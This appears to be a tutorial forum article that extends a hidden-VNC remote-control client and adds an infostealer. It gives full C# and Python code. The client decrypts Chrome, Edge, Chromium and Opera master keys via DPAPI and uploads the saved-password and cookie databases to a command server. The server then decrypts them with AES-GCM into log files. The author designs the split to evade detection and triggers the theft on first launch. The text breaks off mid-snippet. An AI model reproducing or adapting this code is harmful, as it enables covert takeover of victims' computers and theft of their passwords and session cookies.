# HVNC-HTML

<a href="https://ibb.co/d4NB0D2"><img src="https://i.ibb.co/MkznD7V/Untitled.png" alt="Untitled" border="0"></a>

<a href="https://ibb.co/mX2Scf9"><img src="https://i.ibb.co/LJcvZVx/Untitle.png" alt="Untitle" border="0"></a>

Outside of writing this article I have changed the HVNC code slightly, here is a list of what was changed in the code:

All functions in the client were converted to asynchronous operation, this helped the broadcast, since previously screenshots were not displayed on the broadcast in order one after another, but were confused and sometimes frames were shown that had already passed a long time ago. Now the broadcast works correctly.
The function for installing the virtual monitor driver has been redesigned. Previously, the monitor had a resolution of 1920 by 1080, but now it is 1024 by 768, this allows you to take smaller screenshots, which is why screenshots are sent from the client to the server faster and the server receives them faster.
Added several commands that the server sends and the client receives, such as the command to stop HVNC.
The HVNC startup order has been slightly changed. Previously, when creating a form and only after launching the browser in it, the broadcast started, now the broadcast starts after opening the form.
Added launch of Windows file manager.
All client code has been divided into several files for better code readability.
Adding coordinates when emulating a mouse along x has been moved from the server to the client using the normal method, which calculates the distance itself, and not by manually specifying it.
Added keyboard emulation.
The full code will be at the end of the article. There are enough comments in it if you would like to study all the changes that I have not described. And now I will show some code snippets (they seem to me the most interesting of all the changes) with changes that were made outside of the previous article.

[CODE]

    C#:
    public static async Task SendPostRequestAsync(string url, string data)
        {
        try

        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            request.Method = "POST";

            request.ContentType = "application/json";



            using (StreamWriter streamWriter = new StreamWriter(await request.GetRequestStreamAsync()))

            {

                string json = JsonConvert.SerializeObject(new { unique_id = data });

                await streamWriter.WriteAsync(json);

            }



           

            using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())

            {

               

                using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))

                {

                    string result = await streamReader.ReadToEndAsync();

                    Console.WriteLine("Response from server: " + result);



                   

                    dynamic responseObject = JsonConvert.DeserializeObject(result);



                 

                    if (responseObject.command != null && responseObject.command.ToString().StartsWith("move_mouse"))

                    {

                        await HVNC.MoveMouse(responseObject.command.ToString());

                    }



                    if (responseObject.command != null && responseObject.command.ToString().StartsWith("press_key"))

                    {

                        string command = responseObject.command.ToString();

                        string keyCodeString = command.Substring("press_key ".Length);

                        if (int.TryParse(keyCodeString, out int keyCode))

                        {

                            Console.WriteLine("Code of the key pressed: " + keyCode);

                            SimulateKeyPress(keyCode);

                        }

                        else

                        {

                            Console.WriteLine("Could not recognize key code: " + keyCodeString);

                        }

                    }



                    if (responseObject.command != null && responseObject.command == "start_hvnc")

                    {

                        await HVNC.StartHVNC(responseObject.command.ToString());

                    }



                    if (responseObject.command != null && responseObject.command == "stop_hvnc")

                    {

                        await HVNC.StopHVNC(responseObject.command.ToString());

                    }



                    if (responseObject.command != null && responseObject.command == "start_hvnc_chrome")

                    {

                        await ChromeComands.StartChrome(responseObject.command.ToString());

                    }



                    if (responseObject.command != null && responseObject.command == "start_hvnc_explorer")

                    {

                        await ExplorerCommands.StartExplorer(responseObject.command.ToString());

                    }

                }

            }

        }

        catch (WebException e)

        {

           

            if (e.Response is HttpWebResponse response)

            {

                using (StreamReader reader = new StreamReader(response.GetResponseStream()))

                {

                    string errorText = reader.ReadToEnd();

                    Console.WriteLine($"Error: {errorText}");

                }

            }

            else

            {

                Console.WriteLine($"No response from server: {e.Message}");

            }

        }

    }

[/CODE]

Previously, there were parts of this code snippet that were responsible for accepting commands such as starting HVNC and starting the browser. Now it does not contain this code, it has been moved to separate files, and here only these methods are called.



Here's an example:

[CODE]

    if (responseObject.command != null && responseObject.command == "start_hvnc")

    {

    await HVNC.StartHVNC(responseObject.command.ToString());

    }

[/CODE]

This code means that if the received command is defined as start_hvnc, then the StartHVNC function is called asynchronously, which in this case is located in the HVNC file in the internal class HVNC. You can understand that the call occurs asynchronously by the word “await”, and because the name of the method in which this code is located contains async Task.



Here is the called function itself:

[CODE]

    public static async Task StartHVNC(string command)
    {



        try

        {

            Console.WriteLine("Starting HVNC.");

            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string zipFilePath = Path.Combine(monitorDriverPath, "monitor.zip");

            string deviceInstallerPath = Path.Combine(monitorDriverPath, "deviceinstaller64.exe");



            if (!Directory.Exists(monitorDriverPath))

            {

                Directory.CreateDirectory(monitorDriverPath);

            }



            if (!File.Exists(deviceInstallerPath))

            {

                using (WebClient webClient = new WebClient())

                {

                    await webClient.DownloadFileTaskAsync(new Uri("{ip}/download_monitor"), zipFilePath);

                    ZipFile.ExtractToDirectory(zipFilePath, monitorDriverPath);

                }

                File.Delete(zipFilePath);

            }



            var cmd = new Process

            {

                StartInfo = new ProcessStartInfo

                {

                    FileName = "cmd.exe",

                    Arguments = $"/C cd /d \"{monitorDriverPath}\" && deviceinstaller64 install usbmmidd.inf usbmmidd",

                    UseShellExecute = false,

                    CreateNoWindow = true

                }

            };

            cmd.Start();

            cmd.WaitForExit();



            string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF\Services\usbmmIdd\Parameters\Monitors";

            string valueName = "(Default)";

            string valueData = "1024.768";



            try

            {

                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))

                {

                    if (key == null)

                    {

                        using (RegistryKey newKey = Registry.LocalMachine.CreateSubKey(registryPath))

                        {

                            newKey.SetValue(valueName, valueData, RegistryValueKind.String);

                        }

                    }

                    else

                    {

                        key.SetValue(valueName, valueData, RegistryValueKind.String);

                    }

                }

                Console.WriteLine("The value was successfully written to the registry.");

            }

            catch (Exception ex)

            {

                Console.WriteLine($"Error writing to the registry: {ex.Message}");

            }



            cmd = new Process

            {

                StartInfo = new ProcessStartInfo

                {

                    FileName = "cmd.exe",

                    Arguments = $"/C cd /d \"{monitorDriverPath}\" && deviceinstaller64 enableidd 1",

                    UseShellExecute = false,

                    CreateNoWindow = true

                }

            };

            cmd.Start();

            cmd.WaitForExit();



            foreach (var screen in Screen.AllScreens)

            {

                Console.WriteLine($"Monitor: {screen.DeviceName}, Resolution: {screen.Bounds.Width}x{screen.Bounds.Height}");

            }



            Variables.lastScreen = Screen.AllScreens[Screen.AllScreens.Length - 1];

            Console.WriteLine($"Last Monitor: {Variables.lastScreen.DeviceName}, Resolution: {Variables.lastScreen.Bounds.Width}x{Variables.lastScreen.Bounds.Height}");



            Application.EnableVisualStyles();

            Application.SetCompatibleTextRenderingDefault(false);

            Variables.hvncForm = new Form

            {

                StartPosition = FormStartPosition.Manual,

                FormBorderStyle = FormBorderStyle.None,

                Location = Variables.lastScreen.Bounds.Location,

                Size = new System.Drawing.Size(Variables.lastScreen.Bounds.Width, Variables.lastScreen.Bounds.Height),

                ShowInTaskbar = false

            };



            Variables.hvncForm.Load += async (sender, e) =>

            {

                IntPtr formHandle = Variables.hvncForm.Handle;

                Console.WriteLine($"Form Handle: {formHandle}");



                await Translations.ScreenshotCallbackAsync();

            };

            Application.Run(Variables.hvncForm);

        }

        catch (Exception ex)

        {

            Console.WriteLine("Error starting HVNC: " + ex.Message);

        }

    }

[/CODE]

Certain changes have been made to this code. For example, asynchrony has again been added to the method. Also, previously, the virtual monitor driver was simply downloaded and launched, then a form was created, and Chrome was already launched in it. Now, after downloading the driver, the resolution settings of the future virtual monitor are changed.



This code is responsible for this:

[CODE]

    string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF\Services\usbmmIdd\Parameters\Monitors";

    string valueName = "(Default)";

    string valueData = "1024.768";



    try

    {

    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))

    {

        if (key == null)

        {

                       

            using (RegistryKey newKey = Registry.LocalMachine.CreateSubKey(registryPath))

            {

                newKey.SetValue(valueName, valueData, RegistryValueKind.String);

            }

        }

        else

        {

            key.SetValue(valueName, valueData, RegistryValueKind.String);

        }

    }

    Console.WriteLine("The value was successfully written to the registry.");

    }

    catch (Exception ex)

    {

    Console.WriteLine($"Error writing to the registry: {ex.Message}");

    }

[/CODE]

At the very beginning there are variables that store the path in the registry where the default setting is located. This parameter stores the resolution of the created monitors. This code finds this default setting and changes its value to 1024x768.



Now I want to show how I added x coordinates so that the emulation took place on the desired monitor. Let me remind you that previously there was no calculation of pixels by x, but a specific number was simply assigned, that is, if the client had a monitor resolution that was not the same as I indicated, then the emulation would have occurred incorrectly.



[CODE]

    var allScreens = Screen.AllScreens;

    int totalXOffset = 0;



    for (int i = 0; i < allScreens.Length - 1; i++)

    {

    totalXOffset += allScreens[i].Bounds.Width;

    }



    x += totalXOffset;



    Cursor.Position = new Point(x, y);
 [/CODE]

In this code, all monitors are received, then the last one is subtracted from all monitors, and then the width of all these monitors (except the last one) is added to the coordinates received from the server. Thus, the mouse will be emulated on the last monitor, which is our virtual one.



In principle, I showed the most interesting of the changes. Now let’s start adding functionality to our project, namely, adding collection of passwords and cookies from the Chrome browser.



First, I’ll explain how it generally works, and then I’ll show simple examples of implementation, then we’ll write full-fledged code.



In order to decrypt passwords from the browser, we first need to find out where they are stored. In this case, we will consider the Chrome browser. Its passwords are located in this path: AppData\Local\Google\Chrome\User Data\Default inside the Login Data file. Login Data is, in fact, a database that simply does not have a file format specified, and its format should be .db. That is, we will use SQLite to open it in the future.



The passwords in the database are, of course, encrypted, and we won’t be able to simply extract them and send them. Passwords are encrypted using AES. I already showed how to encrypt using AES in my previous topic on how to make a cloud of files. Now let's look at its decoding.



Since the passwords are encrypted via AES, we need a key to decrypt them. The key is located in AppData\Local\Google\Chrome\User Data inside the Local State file



I explain how to get the correct decryption key:

Local State contains JSON, we need to read it and find the encrypted_key in it, the key will be stored in it. But it’s not that simple, again. This key is also encrypted and contains characters that we don't need and are not part of the key. Namely, these are the first 5 bytes of the key. These bytes store the word DPAPI. So before decrypting, we will need to first convert the base64 key to bytes, trim the first 5 bytes, then convert that back to base64 and decrypt the resulting trimmed key using DPAPI. After this we will receive a full decryption key.



I also want to clarify that DPAPI cannot simply be decrypted on the server side, so we will have to decrypt it on the client to get the key. But AES can be decrypted anywhere, so we will decrypt the key on the client, transfer it along with the encrypted passwords to the server, and on the server we will decrypt the passwords using the received key. Thus, fewer suspicious actions will take place on the client, which will clearly have a positive effect on the detection process.

Now I’ll break down point by point how the key will be decrypted:

Getting the key from Local State
Converting a key from base64 to bytes
Trim first 5 bytes
Translation back to base64
Decryption via DPAPI
Now I’ll explain how exactly the password from the database will be decrypted:

The password column contains not only the password itself, but also symbols and IVs that are useless to us.

IVs are random or pseudo-random characters that help make data encryption unique and eliminate repetition. Perhaps the definition is not the most accurate, but at least it makes it roughly clear what it is and what it is for.



Now let's take a closer look at where all this is located in the password line:

The first 3 characters are garbage, we will delete it
Then, after the 3rd character and up to the 15th character there is IV, we will save it, since it will be needed for decryption
After the 15th character there is the encrypted password itself
Now that we've covered the basics, let's start writing sample code that clearly shows how this will work in our project in the future.



Obtaining and decrypting the key:

[CODE]

    using System;

    using System.IO;

    using Newtonsoft.Json.Linq;

    using System.Text;

    using System.Linq;

    using System.Security.Cryptography;



    class Program

    {

    static void Main(string[] args)

    {

        try

        {



            string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");





            if (File.Exists(localStatePath))

            {



                string localStateData = File.ReadAllText(localStatePath);





                dynamic json = JObject.Parse(localStateData);





                string encryptedKeyBase64 = json.os_crypt.encrypted_key;





                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);





                byte[] trimmedKey = encryptedKey.Skip(5).ToArray();



                byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);

                string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);

                Console.WriteLine($"Decrypted Key (Base64): {decryptedKeyBase64}");



            }

            else

            {

                Console.WriteLine("Local State file not found");

            }

        }

        catch (Exception ex)

        {

            Console.WriteLine($"Error: {ex.Message}");

        }



        Console.ReadKey();

    }

    }

[/CODE]



[CODE]

    string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Local State");[/CODE] Specifies the path to the file with the key
[CODE]

    string localStateData = File.ReadAllText(localStatePath); [/CODE] Reads data from a file
[CODE]

    dynamic json = JObject.Parse(localStateData); [/CODE] Converts file contents to json
[CODE]

    string encryptedKeyBase64 = json.os_crypt.encrypted_key; [/CODE] Searches for a key by encrypted_key
[CODE]

    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64); [/CODE] Decodes a key from base64 into bytes
[CODE]

    byte[] trimmedKey = encryptedKey.Skip(5).ToArray(); [/CODE] Removes first 5 bytes
[CODE]

    byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);
    string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
    Console.WriteLine($"Decrypted Key (Base64): {decryptedKeyBase64}"); 
 [/CODE] Decrypts via DPAPI using the System.Security.Cryptography library
 
Now let's look at the code for decrypting the password using the key obtained earlier:

[CODE=python]

    import sqlite3

    import base64

    from Crypto.Cipher import AES



    def decrypt_password(buffer, master_key):

    try:

        iv = buffer[3:15]

        payload = buffer[15:]

        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_pass = cipher.decrypt(payload)[:-16].decode()

        return decrypted_pass

    except Exception as e:

        return f"Error decrypting password: {e}"



    def main():



    login_data_path = ""



    connection = sqlite3.connect(login_data_path)

    cursor = connection.cursor()



    cursor.execute("SELECT password_value FROM logins")



    for row in cursor.fetchall():

        encrypted_password = row[0]

        decrypted_password = decrypt_password(encrypted_password, master_key)

        print("Decrypted Password:", decrypted_password)



    connection.close()



    if __name__ == "__main__":

    master_key_base64 = ""

    master_key = base64.b64decode(master_key_base64)



    main()

[/CODE]



[CODE=python]

    def decrypt_password(buffer, master_key):
    try:
        iv = buffer[3:15]
        payload = buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt( payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return f"Error decrypting password: {e}"
[/CODE] Skips the first 3 characters and defines characters 4 to 15 as IV. Then from the 15th character to the end it defines it as a password. Decrypts the password via AES using the key specified below.
[CODE=python]

    login_data_path [/CODE] Path to the database file with passwords
[CODE=python]

    connection = sqlite3.connect(login_data_path)
    cursor = connection.cursor() 
 [/CODE] Connect to the database
[CODE=python]

    cursor.execute("SELECT password_value FROM logins") [/CODE] Execute a query against the logins table and within it against the password_value column
[CODE=python]

    master_key_base64 [/CODE] Key in base 64 format
[CODE=python]

    master_key = base64.b64decode(master_key_base64) 
[/CODE] Decoding the key into bytes
We have looked at the example, now we will implement this in practice inside our HVNC project.

First, let's expand the client so that it can collect passwords and cookies and send them along with the key.

First of all, let's create the BrowserGrabber method.
Inside the method we will specify the dictionary to the main browser folders where the file with the key is located. 
[CODE]

    Dictionary<string, string> browserPaths = new Dictionary<string, string>{
    { "Google Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data ") },
    { "Microsoft Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data") },
    { "Chromium", Path.Combine(Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData), @"Chromium\User Data") },
    { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable") } }
    ;
[/CODE]
We create the main JSON object in which all information will be stored. 
[CODE]

    JObject mainJson = new JObject();[/CODE]
Also in the foreach loop we read the contents from the file with the key 
[CODE]

    string localStateData = File.ReadAllText(localStatePath);
[/CODE]
Convert the received content to json 
[CODE]

    dynamic json = JObject.Parse(localStateData);
[/CODE]
We look for the key in the content 
[CODE]

    string encryptedKeyBase64 = json.os_crypt.encrypted_key;
[/CODE]
We decode the received key into bytes 
[CODE]

    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
[/CODE]
Remove the first 5 bytes 
[CODE]

    byte[] trimmedKey = encryptedKey.Skip(5).ToArray();
[/CODE]
Decrypting a key via DPAPI 
[CODE]

    byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser); string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
[/CODE]
Creating an object for the browser whose key was found 
[CODE]

    JObject browserJson = new JObject{
    ["key"] = decryptedKeyBase64
    };
[/CODE]
Recursive search for a file with cookies and passwords. 
[CODE]

    var loginDataFiles = Directory.GetFiles(userDataPath, "Login Data", SearchOption.AllDirectories);var cookiesFiles = Directory.GetFiles(userDataPath, "Cookies", SearchOption.AllDirectories);
[/CODE]
The found files are converted to base64 and then added to the browser's json object
[CODE]

    JArray loginDataArray = new JArray(); foreach (var loginDataPath in loginDataFiles)
    {
     try
     {
         if (File.Exists(loginDataPath))
         {
             byte[] loginDataBytes = File.ReadAllBytes(loginDataPath);
             string loginDataBase64 = Convert.ToBase64String(loginDataBytes);
             loginDataArray.Add(loginDataBase64);
         }
     }
     catch (Exception ex)
     {
         Console.WriteLine($"Could not access Login Data file: {loginDataPath}. Error: {ex.Message}");
         continue;
     }
    }
    browserJson["login_data"] = loginDataArray;
[/CODE]
The same for a cookie file 
[CODE]

    JArray cookiesArray = new JArray();                   
    foreach (var cookiesPath in cookiesFiles)
                    {
                        try
                        {
                            if (File.Exists(cookiesPath))
                            {
                                byte[] cookiesDataBytes = File.ReadAllBytes(cookiesPath);
                                string cookiesDataBase64 = Convert.ToBase64String(cookiesDataBytes);
                                cookiesArray.Add(cookiesDataBase64);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Cookies could not be accessed: {cookiesPath}. Error: {ex.Message}");
                            continue;
                        }
                    }
                    browserJson["cookies"] = cookiesArray;
[/CODE]
After writing all the necessary data to the browser object, the browser object is added to the main object: 
[CODE]

    mainJson[browserName] = browserJson;
[/CODE]Since all this code is in a foreach loop, this code will be repeated over and over again , until the entire list from the dictionary with paths ends.
Sending JSON to the server at browser_log plus a unique user ID: 
[CODE]

    await SendPostRequestAsync($"{Variables.ip}/browser_log/{Variables.uniqueId}", mainJson.ToString());
[/CODE]
For those who don't want to learn the code line by line, here is the complete code for the function.

[CODE]

    static async Task BrowserGrabber()

    {

    try

    {

        Dictionary<string, string> browserPaths = new Dictionary<string, string>

        {

            { "Google Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data") },

            { "Microsoft Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data") },

            { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Chromium\User Data") },

            { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable") }

        };





        JObject mainJson = new JObject();



        foreach (var browser in browserPaths)

        {

            string browserName = browser.Key;

            string userDataPath = browser.Value;



            Console.WriteLine($"Browser in use: {browserName}");

            Console.WriteLine($"Path to User Data folder: {userDataPath}");





            string localStatePath = Path.Combine(userDataPath, "Local State");

            if (File.Exists(localStatePath))

            {



                string localStateData = File.ReadAllText(localStatePath);



                dynamic json = JObject.Parse(localStateData);



                string encryptedKeyBase64 = json.os_crypt.encrypted_key;



                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);



                byte[] trimmedKey = encryptedKey.Skip(5).ToArray();





                byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);

                string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);

                Console.WriteLine($"Decrypted Key (Base64): {decryptedKeyBase64}");



                JObject browserJson = new JObject

                {

                    ["key"] = decryptedKeyBase64

                };





                var loginDataFiles = Directory.GetFiles(userDataPath, "Login Data", SearchOption.AllDirectories);

                var cookiesFiles = Directory.GetFiles(userDataPath, "Cookies", SearchOption.AllDirectories);





                JArray loginDataArray = new JArray();

                foreach (var loginDataPath in loginDataFiles)

                {

                    try

                    {

                        if (File.Exists(loginDataPath))

                        {

                            byte[] loginDataBytes = File.ReadAllBytes(loginDataPath);

                            string loginDataBase64 = Convert.ToBase64String(loginDataBytes);

                            loginDataArray.Add(loginDataBase64);

                        }

                    }

                    catch (Exception ex)

                    {

                        Console.WriteLine($"Failed to access Login Data file: {loginDataPath}. Error: {ex.Message}");

                        continue;

                    }

                }

                browserJson["login_data"] = loginDataArray;



                JArray cookiesArray = new JArray();

                foreach (var cookiesPath in cookiesFiles)

                {

                    try

                    {

                        if (File.Exists(cookiesPath))

                        {

                            byte[] cookiesDataBytes = File.ReadAllBytes(cookiesPath);

                            string cookiesDataBase64 = Convert.ToBase64String(cookiesDataBytes);

                            cookiesArray.Add(cookiesDataBase64);

                        }

                    }

                    catch (Exception ex)

                    {

                        Console.WriteLine($"Failed to access Cookies file: {cookiesPath}. Error: {ex.Message}");

                        continue;

                    }

                }

                browserJson["cookies"] = cookiesArray;





                mainJson[browserName] = browserJson;

            }

            else

            {

                Console.WriteLine($"Local State file for browser {browserName} not found");

            }

        }





        await SendPostRequestAsync($"{Variables.ip}/browser_log/{Variables.uniqueId}", mainJson.ToString());

    }

    catch (Exception ex)

    {

        Console.WriteLine($"Error: {ex.Message}");

    }

    }

[/CODE]



Now that we have written and parsed the method, we need to call it somewhere. It seems to me that the best option would be during the initial launch of the client, that is, when a unique identifier is not found and the client creates it. Here's what it looks like in code:

[CODE]

    // Load or create a unique identifier

    if (File.Exists(filePath))

    {

    Variables.uniqueId = File.ReadAllText(filePath).Trim(); // Load a unique identifier from a file

    }

    else

    {

    Variables.uniqueId = Guid.NewGuid().ToString(); // Generate a new unique identifier

    await WriteToFileAsync(filePath, Variables.uniqueId); // Write a unique identifier to a file

    await SendPostRequestAsync($"{Variables.ip}/receive_id", Variables.uniqueId); // Send a unique identifier to the server

    await BrowserGrabber(); // Call browser file collection and key decryption

    }

[/CODE]



Let's now look at the server side of the code, which will accept JSON and decrypt AES.

[CODE=python]

    def decrypt_password(buffer, master_key):

    try:

        iv = buffer[3:15]

        payload = buffer[15:]

        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_pass = cipher.decrypt(payload)[:-16].decode()

        return decrypted_pass

    except Exception as e:

        return f"Error decrypting password: {e}"





    def decrypt_cookie(buffer, master_key):

    try:

        iv = buffer[3:15]

        payload = buffer[15:]

        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_cookie = cipher.decrypt(payload)[:-16].decode()

        return decrypted_cookie

    except Exception as e:

        return f"Error decrypting cookie: {e}"





    def process_cookies(cookies_db, master_key, cookies_file_path):

    try:

        cookies_list = ''



        temp_cookies_db = os.path.join(os.path.dirname(cookies_file_path), f"temp_cookies_db_{time.time()}.db")



        with open(temp_cookies_db, "wb") as f:

            f.write(cookies_db)



        conn = sqlite3.connect(temp_cookies_db)

        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")



        for item in cursor.fetchall():

            try:

                decrypted_value = decrypt_cookie(item[2], master_key)

                if decrypted_value:

                    cookies_list += f'{item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])) .upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}\n'

            except sqlite3.Error as e:

                print(f"Error cookies: {e}")



        conn.close()

        os.remove(temp_cookies_db)



        if cookies_list:

            with open(cookies_file_path, 'w') as cookies_file:

                cookies_file.write(cookies_list)



    except Exception as e:

        print(f"Error cookies: {e}")





    @app.route('/browser_log/<unique_id>', methods=['POST'])

    def receive_browser_log(unique_id):

    try:

        data = request.json

        if data is None or not isinstance(data, dict):

            return json.dumps({'error': 'Incorrect data format.'}, ensure_ascii=False), 400



        client_data_str = data.get("Client")

        if client_data_str is None:

            return json.dumps({'error': 'Data for browsers is missing from the request.'}, ensure_ascii=False), 400



        client_data = json.loads(client_data_str)



        unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)

        os.makedirs(unique_id_logs_dir, exist_ok=True)



        passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')

        with open(passwords_file_path, 'w') as passwords_file:

            for browser_name, browser_data in client_data.items():

                key_base64 = browser_data.get("key")

                if key_base64 is None:

                    print(f'The browser {browser_name} is missing a key.')

                    continue



                key = base64.b64decode(key_base64)



                for param_name, param_value in browser_data.items():

                    if param_name == "key":

                        continue



                    if isinstance(param_value, list):

                        for idx, file_data in enumerate(param_value):

                            try:

                                decoded_data = base64.b64decode(file_data)

                                db_name = f'{browser_name}_{param_name}_{idx}.db'

                                db_path = os.path.join(unique_id_logs_dir, db_name)



                                with open(db_path, 'wb') as db_file:

                                    db_file.write(decoded_data)



                                if param_name == "login_data":

                                    connection = sqlite3.connect(db_path)

                                    cursor = connection.cursor()

                                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")



                                    for row in cursor.fetchall():

                                        origin_url = row[0]

                                        username_value = row[1]

                                        encrypted_password = row[2]



                                        decrypted_password = decrypt_password(encrypted_password, key)

                                        if decrypted_password and username_value:

                                            passwords_file.write(f'Browser: {browser_name}\n')

                                            passwords_file.write(f'Origin URL: {origin_url}\n')

                                            passwords_file.write(f'Username: {username_value}\n')

                                            passwords_file.write(f'Password: {decrypted_password}\n')

                                            passwords_file.write('\n')



                                    print(f"File {db_name} was successfully saved and passwords were decrypted.")

                                    connection.close()



                                elif param_name == "cookies":

                                    cookies_file_path = os.path.join(unique_id_logs_dir, f'cookies_{browser_name}_{idx}.txt')

                                    process_cookies(decoded_data, key, cookies_file_path)

                                    print(f"File {db_name} was successfully saved and cookies were decrypted.")



                                # Deleting the temporary database file after processing

                                os.remove(db_path)



                            except Exception as e:

                                print(f"Error processing file: {str(e)}")



        print("Received data from a client with a unique identifier:", unique_id)



        return json.dumps({'message': 'Data successfully received and processed.'}, ensure_ascii=False), 200

    except Exception as e:

        return json.dumps({'error': f'Error while processing data: {str(e)}'}, ensure_ascii=False), 500

[/CODE]



Now let's look at this code in parts.

[CODE=python]

    def receive_browser_log(unique_id):
[/CODE] This function first receives JSON from the client
[CODE=python]

    unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
    os.makedirs(unique_id_logs_dir, exist_ok=True)
[/CODE] Create a directory in which the logs will be stored. Each client's log folder will be named after its unique ID
[CODE=python]

    passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')[/CODE] Path to the file in which passwords will be written
[CODE=python]

    key_base64 = browser_data.get("key")
    if key_base64 is None:
    print(f'There is no key in the browser {browser_name}.')
    continue
[/CODE] Getting the key in base64 format from the data received from the client
[CODE=python]

    key = base64.b64decode(key_base64)
[/CODE] Decoding a key from base64 to bytes
[CODE=python]

    decoded_data = base64.b64decode(file_data)
    db_name = f'{browser_name}_{param_name}_{idx}.db'
    db_path = os.path.join(unique_id_logs_dir, db_name)

    with open(db_path, 'wb ') as db_file:
    db_file.write(decoded_data)

[/CODE] This code decodes files from base64, namely databases with logins and passwords. Then these decoded files are written to the log folder that we created earlier.
[CODE=python]

    if (param_name == "login_data"):
    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
[/CODE] If JSON contains the login_data parameter, then in this case a connection to this database occurs
[CODE=python]

    origin_url = row[0]
    username_value = row[1]
    encrypted_password = row[2]
[/CODE] These rows are responsible for extracting data from the columns
[CODE=python]

    decrypted_password = decrypt_password(encrypted_password, key)
[/CODE]The decrypt_password function is called and passed the encrypted password and the key     that was previously decoded from base64.
[CODE=python]

    passwords_file.write(f'Browser: {browser_name}\n')
    passwords_file.write(f'Origin URL: {origin_url}\n')
    passwords_file.write(f'Username: {username_value}\n' )
    passwords_file.write(f'Password: {decrypted_password}\n')
[/CODE] Write data from database columns to a previously created text file for passwords, and the     decrypted password itself.
[CODE=python]

    elif param_name == "cookies":
    cookies_file_path = os.path.join(unique_id_logs_dir,
                                     f'cookies_{browser_name}_{idx}.txt')
    process_cookies(decoded_data, key, cookies_file_path)
    print(f"File {db_name} was successfully saved and cookies were decrypted.")
[/CODE] In this code, it first checks whether there is a cookies parameter in the JSON; if it exists, then the path for saving the file is formed.
[CODE=python]

    process_cookies(decoded_data, key, cookies_file_path)
[/CODE] The process_cookie function is called, which is passed the key, decoded cookie data and the path to the file in which the cookies will be written.
We have already discussed the decryption function earlier in an example of how it all works. So let's look at the process_cookies function for working with cookies.

[CODE=python]

    def process_cookies(cookies_db, master_key, cookies_file_path):

    try:

        cookies_list = ''



        temp_cookies_db = os.path.join(os.path.dirname(cookies_file_path), f"temp_cookies_db_{time.time()}.db")



        with open(temp_cookies_db, "wb") as f:

            f.write(cookies_db)



        conn = sqlite3.connect(temp_cookies_db)

        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")



        for item in cursor.fetchall():

            try:

                decrypted_value = decrypt_cookie(item[2], master_key)

                if decrypted_value:

                    cookies_list += f'{item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])) .upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}\n'

            except sqlite3.Error as e:

                print(f"Error cookies: {e}")



        conn.close()

        os.remove(temp_cookies_db)



        if cookies_list:

            with open(cookies_file_path, 'w') as cookies_file:

                cookies_file.write(cookies_list)



    except Exception as e:

        print(f"Error cookies: {e}")

[/CODE]

In this code, a temporary database is first created, then a connection is made to the database. The database takes data from these columns:

[CODE=python]

    host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
[/CODE]



Then the decryption function is called:

[CODE=python]

    decrypted_value = decrypt_cookie(item[2], master_key)

